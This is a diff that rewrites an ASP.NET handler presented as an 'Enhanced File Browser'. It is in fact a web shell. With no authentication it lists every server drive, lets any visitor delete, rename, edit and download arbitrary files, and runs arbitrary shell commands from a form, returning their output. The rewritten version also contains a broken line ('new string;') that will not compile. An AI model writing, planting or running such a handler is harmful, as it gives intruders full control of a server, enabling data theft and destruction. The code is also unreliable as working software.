@@ -1,353 +1,345 @@
-<%@ WebHandler Language="C#" Class="EnhancedFileBrowser" %>
+<%@ WebHandler Language="C#" Class="EnhancedBrowserCorrected" %>
 using System;
-using System.Web;
 using System.IO;
 using System.Text;
 using System.Diagnostics;
+using System.Web;
 
-public class EnhancedFileBrowser : IHttpHandler
+public class EnhancedBrowserCorrected : IHttpHandler
 {
-    private const string DefaultFolder = @"C:\"; // Change as per your server environment
+    private const string DefaultPath = @"C:\"; // Adjust this for your environment
 
     public void ProcessRequest(HttpContext context)
     {
         context.Response.ContentType = "text/html; charset=utf-8";
 
-        string action = context.Request["action"];
-        string requestedPath = context.Request["path"];
+        string action = context.Request["action"] ?? "";
+        string inputPath = context.Request["path"] ?? "";
 
-        string currentPath = ValidatePathOrDefault(requestedPath);
+        string currentPath = ValidatePath(inputPath);
 
-        StringBuilder html = new StringBuilder();
-        html.AppendLine("<html><head><title>Enhanced File Browser</title>");
-        html.AppendLine("<style>");
-        html.AppendLine("body{font-family:Segoe UI,sans-serif;}");
-        html.AppendLine("nav { margin-bottom: 20px; }");
-        html.AppendLine("nav a { margin-right: 15px; text-decoration:none; font-weight:bold; cursor:pointer;}");
-        html.AppendLine("table { border-collapse: collapse; width: 100%; }");
-        html.AppendLine("th, td {border: 1px solid #ccc; padding: 8px; text-align:left;}");
-        html.AppendLine("tr:hover {background-color: #f0f0f0;}");
-        html.AppendLine(".error{color:red;} .success{color:green;}");
-        html.AppendLine(".tab {display:none;} .tab.active{display:block;}");
-        html.AppendLine(".button {padding:5px 10px; margin:2px; cursor:pointer;}");
-        html.AppendLine("ul.dir-list {list-style:none; padding-left:0; margin:0 0 1em 0;}");
-        html.AppendLine("ul.dir-list li {margin:3px 0;}");
-        html.AppendLine("a.back-link { font-weight:bold; display:inline-block; margin-bottom:10px; text-decoration:none; }");
-        html.AppendLine("a.back-link:hover { text-decoration: underline; }");
-        html.AppendLine("</style>");
-        html.AppendLine("<script>");
-        html.AppendLine("function showTab(id) {");
-        html.AppendLine("var tabs = document.getElementsByClassName('tab');");
-        html.AppendLine("for(var i=0; i<tabs.length; i++) { tabs[i].classList.remove('active'); }");
-        html.AppendLine("document.getElementById(id).classList.add('active');");
-        html.AppendLine("}");
-        html.AppendLine("function confirmDelete(path) {");
-        html.AppendLine("if(confirm('Are you sure to delete ' + path + '?')) {");
-        html.AppendLine("window.location.href = '?action=delete&path=' + encodeURIComponent(path);");
-        html.AppendLine("}");
-        html.AppendLine("}");
-        html.AppendLine("function renameFile(path) {");
-        html.AppendLine("var newName = prompt('Enter new name:', '');");
-        html.AppendLine("if(newName) {");
-        html.AppendLine("var url = '?action=rename&path=' + encodeURIComponent(path) + '&newname=' + encodeURIComponent(newName);");
-        html.AppendLine("window.location.href = url;");
-        html.AppendLine("}");
-        html.AppendLine("}");
-        html.AppendLine("function editFile(path) {");
-        html.AppendLine("var url = '?action=editform&path=' + encodeURIComponent(path);");
-        html.AppendLine("window.location.href = url;");
-        html.AppendLine("}");
-        html.AppendLine("function toggleDrives() {");
-        html.AppendLine("var d = document.getElementById('drivesList');");
-        html.AppendLine("if(d.style.display === 'none' || d.style.display === '') d.style.display = 'block';");
-        html.AppendLine("else d.style.display = 'none';");
-        html.AppendLine("}");
-        html.AppendLine("function executeCommand(event) {");
-        html.AppendLine("event.preventDefault();");
-        html.AppendLine("var form = event.target;");
-        html.AppendLine("var xhr = new XMLHttpRequest();");
-        html.AppendLine("var formData = new FormData(form);");
-        html.AppendLine("xhr.open('POST', form.action, true);");
-        html.AppendLine("xhr.onload = function() {");
-        html.AppendLine("if(xhr.status === 200) {");
-        html.AppendLine("document.getElementById('cmdOutput').innerHTML = '<pre style=\"background:#eee;padding:10px;\">' + xhr.responseText.replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</pre>';}");
-        html.AppendLine("};");
-        html.AppendLine("xhr.send(formData);");
-        html.AppendLine("}");
-        html.AppendLine("</script>");
-        html.AppendLine("</head><body>");
+        StringBuilder sb = new StringBuilder();
 
-        // Drives list toggle button and container
-        html.AppendLine("<button onclick='toggleDrives()' style='margin-bottom:10px;padding:5px 10px;'>Toggle Drives List</button>");
-        html.AppendLine("<div id='drivesList' style='display:none;border:1px solid #ccc;padding:10px;margin-bottom:15px;background:#f9f9f9;'>");
+        // Start HTML + head + styles
+        sb.AppendLine("<!DOCTYPE html>");
+        sb.AppendLine("<html><head><title>Enhanced File Browser</title>");
+        sb.AppendLine("<style>");
+        sb.AppendLine("body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }");
+        sb.AppendLine("nav { margin-bottom: 20px; }");
+        sb.AppendLine("nav a { margin-right: 15px; cursor: pointer; font-weight: bold; text-decoration: none; }");
+        sb.AppendLine("nav a:hover { text-decoration: underline; }");
+        sb.AppendLine("table { width: 100%; border-collapse: collapse; }");
+        sb.AppendLine("th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }");
+        sb.AppendLine("tr:hover { background-color: #efefef; }");
+        sb.AppendLine(".button { margin: 2px; padding: 5px 10px; cursor: pointer; }");
+        sb.AppendLine(".error { color: red; }");
+        sb.AppendLine(".success { color: green; }");
+        sb.AppendLine(".tab { display: none; }");
+        sb.AppendLine(".tab.active { display: block; }");
+        sb.AppendLine("#drivesList { padding: 10px; background: #f9f9f9; border: 1px solid #ccc; margin-bottom: 15px; }");
+        sb.AppendLine("#drivesList a { font-weight: bold; margin-right: 15px; }");
+        sb.AppendLine(".back-link { font-weight: bold; margin-bottom: 10px; display: inline-block; }");
+        sb.AppendLine("</style>");
 
+        // JavaScript section
+        sb.AppendLine("<script>");
+        sb.AppendLine("function showTab(id) {");
+        sb.AppendLine("  var tabs = document.getElementsByClassName('tab');");
+        sb.AppendLine("  for (var i=0; i < tabs.length; i++) { tabs[i].classList.remove('active'); }");
+        sb.AppendLine("  document.getElementById(id).classList.add('active');");
+        sb.AppendLine("}");
+        sb.AppendLine("function toggleDrives() {");
+        sb.AppendLine("  var elem = document.getElementById('drivesList');");
+        sb.AppendLine("  if (elem.style.display === 'none' || elem.style.display === '') elem.style.display = 'block'; else elem.style.display = 'none';");
+        sb.AppendLine("}");
+        sb.AppendLine("function confirmDelete(path) {");
+        sb.AppendLine("  if(confirm('Are you sure you want to delete: ' + path + '?')) { window.location = '?action=delete&path=' + encodeURIComponent(path); }");
+        sb.AppendLine("}");
+        sb.AppendLine("function renameItem(path) {");
+        sb.AppendLine("  var newName = prompt('Enter new name:', '');");
+        sb.AppendLine("  if(newName) { window.location = '?action=rename&path=' + encodeURIComponent(path) + '&newname=' + encodeURIComponent(newName); }");
+        sb.AppendLine("}");
+        sb.AppendLine("function editFile(path) {");
+        sb.AppendLine("  window.location = '?action=editform&path=' + encodeURIComponent(path);");
+        sb.AppendLine("}");
+        sb.AppendLine("function executeCmd(event) {");
+        sb.AppendLine("  event.preventDefault();");
+        sb.AppendLine("  var form = event.target;");
+        sb.AppendLine("  var xhr = new XMLHttpRequest();");
+        sb.AppendLine("  var formData = new FormData(form);");
+        sb.AppendLine("  xhr.open('POST', form.action, true);");
+        sb.AppendLine("  xhr.onload = function() {");
+        sb.AppendLine("    if(xhr.status === 200) {");
+        sb.AppendLine("      document.getElementById('cmdOutput').innerHTML = '<pre style=\"background:#eee;padding:10px;\">' + xhr.responseText.replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</pre>';");
+        sb.AppendLine("    }");
+        sb.AppendLine("  };");
+        sb.AppendLine("  xhr.send(formData);");
+        sb.AppendLine("}");
+        sb.AppendLine("</script>");
+
+        sb.AppendLine("</head><body>");
+
+        // Drives list and toggle button
+        sb.AppendLine("<button onclick='toggleDrives()' style='margin-bottom: 10px;'>Toggle Drives</button>");
+        sb.AppendLine("<div id='drivesList' style='display: none;'>");
         try
         {
             string[] drives = Environment.GetLogicalDrives();
-            foreach (string drive in drives)
+            foreach (var drive in drives)
             {
-                string encodedDrive = HttpUtility.UrlEncode(drive);
-                html.AppendLine($"<a href='?path={encodedDrive}' style='margin-right:15px;font-weight:bold;'>{drive}</a>");
+                string urlEncoded = HttpUtility.UrlEncode(drive);
+                sb.AppendFormat("<a href='?path={0}'>{1}</a>", urlEncoded, drive);
             }
         }
-        catch { /* Ignore exceptions here */ }
-        html.AppendLine("</div>");
+        catch { }
+        sb.AppendLine("</div>");
 
-        html.AppendLine("<nav>");
-        html.AppendLine("<a onclick=\"showTab('browseTab')\">Browse Files</a> | ");
-        html.AppendLine("<a onclick=\"showTab('cmdTab')\">Command Exec</a>");
-        html.AppendLine("</nav>");
+        sb.AppendLine("<nav>");
+        sb.AppendLine("<a onclick=\"showTab('browseTab')\">Browse</a> | ");
+        sb.AppendLine("<a onclick=\"showTab('cmdTab')\">Command</a>");
+        sb.AppendLine("</nav>");
 
-        string message = PerformActions(context, action, currentPath, out currentPath);
+        string message = ProcessAction(context, action, out currentPath);
         if (!string.IsNullOrEmpty(message))
         {
-            html.AppendLine($"<p>{message}</p>");
+            sb.AppendFormat("<p>{0}</p>", message);
         }
 
-        html.AppendLine("<div id='browseTab' class='tab active'>");
-        html.AppendLine(RenderFileBrowser(context, currentPath));
-        html.AppendLine("</div>");
+        sb.AppendFormat("<div class='tab active' id='browseTab'>{0}</div>", RenderBrowser(context, currentPath));
+        sb.AppendFormat("<div class='tab' id='cmdTab'>{0}</div>", RenderCommand(context));
 
-        html.AppendLine("<div id='cmdTab' class='tab'>");
-        html.AppendLine(RenderCommandExec(context));
-        html.AppendLine("</div>");
+        sb.AppendLine("</body></html>");
 
-        html.AppendLine("</body></html>");
-        context.Response.Write(html.ToString());
+        context.Response.Write(sb.ToString());
     }
 
-    private string ValidatePathOrDefault(string path)
+    private string ProcessAction(HttpContext context, string action, out string currentPath)
     {
-        if (string.IsNullOrWhiteSpace(path))
-            return DefaultFolder;
-        try
-        {
-            if (Directory.Exists(path)) return path;
-            if (File.Exists(path)) return Path.GetDirectoryName(path);
-        }
-        catch { }
-        return DefaultFolder;
-    }
+        currentPath = ValidatePath(context.Request["path"]);
 
-    private string PerformActions(HttpContext context, string action, string currentPath, out string updatedPath)
-    {
-        updatedPath = currentPath;
-        if (string.IsNullOrWhiteSpace(action)) return null;
+        if (string.IsNullOrEmpty(action))
+            return null;
 
         try
         {
-            switch (action.ToLower())
+            switch (action.ToLowerInvariant())
             {
                 case "delete":
                     {
-                        string target = context.Request["path"];
-                        if (string.IsNullOrWhiteSpace(target))
-                            return "<span class='error'>Delete failed: Path missing.</span>";
-                        if (File.Exists(target))
+                        string pathToDelete = context.Request["path"];
+                        if (string.IsNullOrWhiteSpace(pathToDelete))
+                            return "<p class='error'>Delete action missing path.</p>";
+
+                        if (File.Exists(pathToDelete))
                         {
-                            File.Delete(target);
-                            return $"<span class='success'>File '{HttpUtility.HtmlEncode(target)}' deleted.</span>";
+                            File.Delete(pathToDelete);
+                            return $"<p class='success'>Deleted file: {HttpUtility.HtmlEncode(pathToDelete)}</p>";
                         }
-                        else if (Directory.Exists(target))
+                        else if (Directory.Exists(pathToDelete))
                         {
-                            Directory.Delete(target, true);
-                            return $"<span class='success'>Folder '{HttpUtility.HtmlEncode(target)}' deleted.</span>";
+                            Directory.Delete(pathToDelete, true);
+                            return $"<p class='success'>Deleted folder: {HttpUtility.HtmlEncode(pathToDelete)}</p>";
                         }
-                        else
-                        {
-                            return $"<span class='error'>Path not found: '{HttpUtility.HtmlEncode(target)}'</span>";
-                        }
+                        else return $"<p class='error'>Path not found: {HttpUtility.HtmlEncode(pathToDelete)}</p>";
                     }
                 case "rename":
                     {
-                        string target = context.Request["path"];
+                        string pathToRename = context.Request["path"];
                         string newName = context.Request["newname"];
-                        if (string.IsNullOrWhiteSpace(target))
-                            return "<span class='error'>Rename failed: Path missing.</span>";
-                        if (string.IsNullOrWhiteSpace(newName))
-                            return "<span class='error'>Rename failed: New name missing.</span>";
-                        string newFullPath = Path.Combine(Path.GetDirectoryName(target), newName);
-                        if (File.Exists(target))
+                        if (string.IsNullOrWhiteSpace(pathToRename) || string.IsNullOrWhiteSpace(newName))
+                            return "<p class='error'>Rename action missing parameters.</p>";
+
+                        string newFullPath = Path.Combine(Path.GetDirectoryName(pathToRename), newName);
+                        if (File.Exists(pathToRename))
                         {
-                            File.Move(target, newFullPath);
-                            updatedPath = Path.GetDirectoryName(newFullPath);
-                            return $"<span class='success'>File renamed to '{HttpUtility.HtmlEncode(newName)}'.</span>";
+                            File.Move(pathToRename, newFullPath);
+                            currentPath = Path.GetDirectoryName(newFullPath);
+                            return $"<p class='success'>Renamed file to: {HttpUtility.HtmlEncode(newName)}</p>";
                         }
-                        else if (Directory.Exists(target))
+                        else if (Directory.Exists(pathToRename))
                         {
-                            Directory.Move(target, newFullPath);
-                            updatedPath = Path.GetDirectoryName(newFullPath);
-                            return $"<span class='success'>Folder renamed to '{HttpUtility.HtmlEncode(newName)}'.</span>";
+                            Directory.Move(pathToRename, newFullPath);
+                            currentPath = Path.GetDirectoryName(newFullPath);
+                            return $"<p class='success'>Renamed folder to: {HttpUtility.HtmlEncode(newName)}</p>";
                         }
-                        else
-                        {
-                            return $"<span class='error'>Original path not found.</span>";
-                        }
+                        else return "<p class='error'>Path for renaming not found.</p>";
                     }
                 case "editform":
-                    return null;
+                    return null; // Handled in UI Generation
                 case "saveedit":
                     {
-                        string filePath = context.Request["path"];
-                        if (string.IsNullOrWhiteSpace(filePath))
-                            return "<span class='error'>Save failed: Path missing.</span>";
-                        if (File.Exists(filePath))
-                        {
-                            string content = context.Request.Form["filecontent"];
-                            File.WriteAllText(filePath, content);
-                            updatedPath = Path.GetDirectoryName(filePath);
-                            return $"<span class='success'>File '{HttpUtility.HtmlEncode(filePath)}' saved successfully.</span>";
-                        }
-                        else
-                        {
-                            return $"<span class='error'>File not found for saving.</span>";
-                        }
+                        string fileEditPath = context.Request["path"];
+                        if (string.IsNullOrWhiteSpace(fileEditPath))
+                            return "<p class='error'>Save edit missing path.</p>";
+                        if (!File.Exists(fileEditPath))
+                            return "<p class='error'>File not found to save.</p>";
+
+                        string content = context.Request.Form["filecontent"] ?? "";
+                        File.WriteAllText(fileEditPath, content);
+                        currentPath = Path.GetDirectoryName(fileEditPath);
+                        return $"<p class='success'>File saved: {HttpUtility.HtmlEncode(fileEditPath)}</p>";
                     }
                 case "newfolder":
                     {
-                        string folderName = context.Request["foldername"];
-                        if (string.IsNullOrWhiteSpace(folderName))
-                            return "<span class='error'>Folder creation failed: Folder name missing.</span>";
-                        string newDir = Path.Combine(currentPath, folderName);
-                        if (!Directory.Exists(newDir))
-                        {
-                            Directory.CreateDirectory(newDir);
-                            return $"<span class='success'>Folder '{HttpUtility.HtmlEncode(folderName)}' created.</span>";
-                        }
-                        else
-                        {
-                            return $"<span class='error'>Folder already exists.</span>";
-                        }
+                        string newFolderName = context.Request["foldername"];
+                        if (string.IsNullOrWhiteSpace(newFolderName))
+                            return "<p class='error'>New folder name missing.</p>";
+
+                        string newFolderPath = Path.Combine(currentPath, newFolderName);
+                        if (Directory.Exists(newFolderPath))
+                            return "<p class='error'>Folder already exists.</p>";
+
+                        Directory.CreateDirectory(newFolderPath);
+                        return $"<p class='success'>Folder created: {HttpUtility.HtmlEncode(newFolderName)}</p>";
                     }
+                case "cmdexec":
+                    return null; // Handled in UI generation
+                case "download":
+                    {
+                        string fileToDownload = context.Request["path"];
+                        if (string.IsNullOrWhiteSpace(fileToDownload) || !File.Exists(fileToDownload))
+                            return "<p class='error'>File not found for download.</p>";
+
+                        HttpResponse resp = context.Response;
+                        resp.Clear();
+                        resp.ContentType = "application/octet-stream";
+                        resp.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(fileToDownload));
+                        resp.TransmitFile(fileToDownload);
+                        resp.End();
+                        return null;
+                    }
+                default:
+                    return null;
             }
         }
         catch (Exception ex)
         {
-            return $"<span class='error'>Error: {HttpUtility.HtmlEncode(ex.Message)}</span>";
+            return $"<p class='error'>Error: {HttpUtility.HtmlEncode(ex.Message)}</p>";
         }
-        return null;
     }
 
-    private string RenderFileBrowser(HttpContext context, string path)
+    private string RenderBrowser(HttpContext context, string currentPath)
     {
         StringBuilder sb = new StringBuilder();
-        sb.Append($"<h2>Browsing: {HttpUtility.HtmlEncode(path)}</h2>");
 
-        sb.Append(@"<form method='get'>
-            <input type='hidden' name='action' value='newfolder'/>
-            <input type='hidden' name='path' value='" + HttpUtility.HtmlEncode(path) + @"'/>
-            New Folder Name: <input type='text' name='foldername' required />
-            <input type='submit' value='Create'/>
-            </form><hr/>");
+        sb.AppendFormat("<h2>Current Path: {0}</h2>", HttpUtility.HtmlEncode(currentPath));
 
-        var parent = Directory.GetParent(path);
+        var parent = Directory.GetParent(currentPath);
         if (parent != null)
         {
-            sb.Append($"<a href='?path={HttpUtility.UrlEncode(parent.FullName)}' class='back-link'>&larr; Back to {HttpUtility.HtmlEncode(parent.FullName)}</a><br/><br/>");
+            sb.AppendFormat("<a href='?path={0}' class='back-link'>&larr; Back to {1}</a><br/><br/>",
+                            HttpUtility.UrlEncode(parent.FullName),
+                            HttpUtility.HtmlEncode(parent.FullName));
         }
 
-        string[] allDirs;
-        try { allDirs = Directory.GetDirectories(path); } catch { allDirs = new string[0]; }
-        if (allDirs.Length > 0)
-        {
-            sb.Append("<b>Directories:</b><ul class='dir-list'>");
-            foreach (var d in allDirs)
-            {
-                var di = new DirectoryInfo(d);
-                sb.Append($"<li><a href='?path={HttpUtility.UrlEncode(d)}'>{HttpUtility.HtmlEncode(di.Name)}</a></li>");
-            }
-            sb.Append("</ul><hr/>");
-        }
-
-        sb.Append("<table><thead><tr><th>Name</th><th>Size</th><th>Last Modified</th><th>Actions</th></tr></thead><tbody>");
+        // Display drives toggle (redundant with global but included for clarity)
+        sb.AppendLine("<p><strong>Drives:</strong></p><ul style='list-style:none;padding-left:0;'>");
         try
         {
-            foreach (var d in allDirs)
+            foreach (var drive in Environment.GetLogicalDrives())
             {
-                var di = new DirectoryInfo(d);
-                sb.Append("<tr>");
-                sb.Append($"<td><b><a href='?path={HttpUtility.UrlEncode(d)}'>{HttpUtility.HtmlEncode(di.Name)}</a></b></td>");
-                sb.Append("<td>--</td>");
-                sb.Append($"<td>{di.LastWriteTime}</td>");
-                sb.Append("<td>");
-                sb.Append($"<button class='button' onclick=\"renameFile('{HttpUtility.JavaScriptStringEncode(d)}')\">Rename</button>");
-                sb.Append($"<button class='button' onclick=\"confirmDelete('{HttpUtility.JavaScriptStringEncode(d)}')\">Delete</button>");
-                sb.Append("</td>");
-                sb.Append("</tr>");
+                sb.AppendFormat("<li style='display:inline-block;margin-right:10px;'><a href='?path={0}'>{1}</a></li>", HttpUtility.UrlEncode(drive), drive);
             }
+        }
+        catch { }
+        sb.AppendLine("</ul><hr/>");
 
-            foreach (var f in Directory.GetFiles(path))
-            {
-                var fi = new FileInfo(f);
-                sb.Append("<tr>");
-                sb.Append($"<td><a href='?action=editform&path={HttpUtility.UrlEncode(f)}'>{HttpUtility.HtmlEncode(fi.Name)}</a></td>");
-                sb.Append($"<td>{FormatSize(fi.Length)}</td>");
-                sb.Append($"<td>{fi.LastWriteTime}</td>");
-                sb.Append("<td>");
-                sb.Append($"<a class='button' href='?action=download&path={HttpUtility.UrlEncode(f)}'>Download</a>");
-                sb.Append($"<button class='button' onclick=\"renameFile('{HttpUtility.JavaScriptStringEncode(f)}')\">Rename</button>");
-                sb.Append($"<button class='button' onclick=\"confirmDelete('{HttpUtility.JavaScriptStringEncode(f)}')\">Delete</button>");
-                sb.Append($"<button class='button' onclick=\"editFile('{HttpUtility.JavaScriptStringEncode(f)}')\">Edit</button>");
-                sb.Append("</td>");
-                sb.Append("</tr>");
-            }
+        // New folder creation form
+        sb.AppendFormat(@"
+            <form method='get'>
+                <input type='hidden' name='action' value='newfolder' />
+                <input type='hidden' name='path' value='{0}' />
+                New Folder: <input type='text' name='foldername' required />
+                <input type='submit' value='Create' />
+            </form>
+            <hr/>", HttpUtility.HtmlEncode(currentPath));
+
+        sb.AppendLine("<table><thead><tr><th>Name</th><th>Size</th><th>Last Modified</th><th>Actions</th></tr></thead><tbody>");
+
+        string[] directories = new string[0];
+        string[] files = new string;
+        try
+        {
+            directories = Directory.GetDirectories(currentPath);
+            files = Directory.GetFiles(currentPath);
         }
         catch (Exception ex)
         {
-            sb.Append($"<tr><td colspan='4' class='error'>Error reading directory: {HttpUtility.HtmlEncode(ex.Message)}</td></tr>");
+            sb.AppendFormat("<tr><td colspan='4' class='error'>Error reading directory: {0}</td></tr>", HttpUtility.HtmlEncode(ex.Message));
         }
-        sb.Append("</tbody></table>");
 
-        if (context.Request["action"] == "editform")
+        foreach (var dir in directories)
+        {
+            var di = new DirectoryInfo(dir);
+            sb.AppendLine("<tr>");
+            sb.AppendFormat("<td><a href='?path={0}'><strong>{1}</strong></a></td>", HttpUtility.UrlEncode(dir), HttpUtility.HtmlEncode(di.Name));
+            sb.Append("<td>--</td>");
+            sb.AppendFormat("<td>{0}</td>", di.LastWriteTime);
+            sb.AppendFormat("<td><button class='button' onclick=\"renameItem('{0}')\">Rename</button> <button class='button' onclick=\"confirmDelete('{0}')\">Delete</button></td>",
+                            HttpUtility.JavaScriptStringEncode(dir));
+            sb.AppendLine("</tr>");
+        }
+
+        foreach (var file in files)
+        {
+            var fi = new FileInfo(file);
+            sb.AppendLine("<tr>");
+            sb.AppendFormat("<td><a href='?path={0}&action=editform'>{1}</a></td>", HttpUtility.UrlEncode(file), HttpUtility.HtmlEncode(fi.Name));
+            sb.AppendFormat("<td>{0}</td>", FormatSize(fi.Length));
+            sb.AppendFormat("<td>{0}</td>", fi.LastWriteTime);
+            sb.AppendFormat("<td><a class='button' href='?path={0}&action=download'>Download</a> <button class='button' onclick=\"renameItem('{1}')\">Rename</button> <button class='button' onclick=\"confirmDelete('{1}')\">Delete</button> <button class='button' onclick=\"editFile('{1}')\">Edit</button></td>",
+                            HttpUtility.UrlEncode(file),
+                            HttpUtility.JavaScriptStringEncode(file));
+            sb.AppendLine("</tr>");
+        }
+
+        sb.AppendLine("</tbody></table>");
+
+        if ((context.Request["action"] ?? "").ToLower() == "editform")
         {
             string editPath = context.Request["path"];
             if (!string.IsNullOrWhiteSpace(editPath) && File.Exists(editPath))
             {
                 string content = File.ReadAllText(editPath);
-                sb.Append("<hr/><h3>Editing File: " + HttpUtility.HtmlEncode(editPath) + "</h3>");
-                sb.Append("<form method='post'>");
-                sb.Append($"<input type='hidden' name='action' value='saveedit'/>");
-                sb.Append($"<input type='hidden' name='path' value='{HttpUtility.HtmlEncode(editPath)}'/>");
-                sb.Append("<textarea name='filecontent' rows='20' cols='100' style='width:100%;font-family:monospace;'>");
+                sb.AppendFormat("<hr/><h3>Editing File: {0}</h3>", HttpUtility.HtmlEncode(editPath));
+                sb.AppendLine("<form method='post'>");
+                sb.AppendFormat("<input type='hidden' name='action' value='saveedit' />");
+                sb.AppendFormat("<input type='hidden' name='path' value='{0}' />", HttpUtility.HtmlEncode(editPath));
+                sb.AppendFormat("<textarea name='filecontent' rows='20' cols='100' style='width:100%; font-family: monospace;'>");
                 sb.Append(HttpUtility.HtmlEncode(content));
-                sb.Append("</textarea><br/>");
-                sb.Append("<input type='submit' value='Save File'/>");
-                sb.Append("</form>");
+                sb.AppendLine("</textarea>");
+                sb.AppendLine("<br/><input type='submit' value='Save' />");
+                sb.AppendLine("</form>");
             }
-            else if (!string.IsNullOrWhiteSpace(editPath))
+            else
             {
-                sb.Append("<p class='error'>File not found for editing.</p>");
+                sb.AppendLine("<p class='error'>File not found for editing.</p>");
             }
         }
-
         return sb.ToString();
     }
 
-    private string RenderCommandExec(HttpContext context)
+    private string RenderCommand(HttpContext context)
     {
         StringBuilder sb = new StringBuilder();
-        sb.Append("<h2>Command Execution</h2>");
-        sb.Append(@"<form method='post' action='EnhancedFileBrowser.ashx' onsubmit='executeCommand(event)'>
-            <input type='hidden' name='action' value='cmdexec'/>
-            <textarea name='cmdtext' rows='10' cols='80' style='width:100%;font-family:monospace;' placeholder='Enter command here'></textarea><br/>
-            <input type='submit' value='Run Command'/>
-            </form><hr/>");
+        sb.AppendLine("<h2>Command Execution</h2>");
+        sb.AppendLine("<form method='post' onsubmit='executeCmd(event)' action=''>");
+        sb.AppendLine("<textarea name='cmdtext' rows='10' cols='80' placeholder='Enter command...' style='width:100%; font-family: monospace;'></textarea>");
+        sb.AppendLine("<br/><input type='submit' value='Run Command' />");
+        sb.AppendLine("</form>");
+        sb.AppendLine("<div id='cmdOutput'>");
 
-        sb.Append("<div id='cmdOutput'>");
-
-        if (context.Request.HttpMethod == "POST" && context.Request["action"] == "cmdexec")
+        if ((context.Request.HttpMethod ?? "").ToUpper() == "POST" && (context.Request["action"] ?? "").ToLower() == "cmdexec")
         {
-            string cmd = context.Request.Form["cmdtext"];
+            string cmd = context.Request.Form["cmdtext"] ?? "";
             if (!string.IsNullOrEmpty(cmd))
             {
                 string output = ExecuteCmd(cmd);
-                sb.Append("<pre style='background:#eee;padding:10px;'>");
-                sb.Append(HttpUtility.HtmlEncode(output));
-                sb.Append("</pre>");
+                sb.AppendFormat("<pre style='background:#eee; padding:10px;'>{0}</pre>", HttpUtility.HtmlEncode(output));
             }
         }
-        sb.Append("</div>");
 
+        sb.AppendLine("</div>");
         return sb.ToString();
     }
 
@@ -362,11 +354,11 @@ public class EnhancedFileBrowser : IHttpHandler
                 UseShellExecute = false,
                 CreateNoWindow = true
             };
-            using (var process = Process.Start(psi))
+            using (Process proc = Process.Start(psi))
             {
-                string output = process.StandardOutput.ReadToEnd();
-                string error = process.StandardError.ReadToEnd();
-                process.WaitForExit();
+                string output = proc.StandardOutput.ReadToEnd();
+                string error = proc.StandardError.ReadToEnd();
+                proc.WaitForExit();
                 return output + (string.IsNullOrEmpty(error) ? "" : "\nERROR:\n" + error);
             }
         }
@@ -384,28 +376,5 @@ public class EnhancedFileBrowser : IHttpHandler
         return (bytes / (1024.0 * 1024 * 1024)).ToString("0.0") + " GB";
     }
 
-    private string DownloadFile(HttpContext context, string file)
-    {
-        try
-        {
-            if (string.IsNullOrWhiteSpace(file) || !File.Exists(file))
-                return "<p class='error'>Download failed: File not found.</p>";
-
-            var fi = new FileInfo(file);
-            context.Response.Clear();
-            context.Response.ContentType = "application/octet-stream";
-            context.Response.AddHeader("Content-Disposition", "attachment; filename=" + fi.Name);
-            context.Response.AddHeader("Content-Length", fi.Length.ToString());
-            context.Response.TransmitFile(file);
-            context.Response.Flush();
-            context.Response.End();
-            return null;
-        }
-        catch (Exception ex)
-        {
-            return "<p class='error'>Download failed: " + HttpUtility.HtmlEncode(ex.Message) + "</p>";
-        }
-    }
-
-    public bool IsReusable { get { return false; } }
+    public bool IsReusable => false;
 }
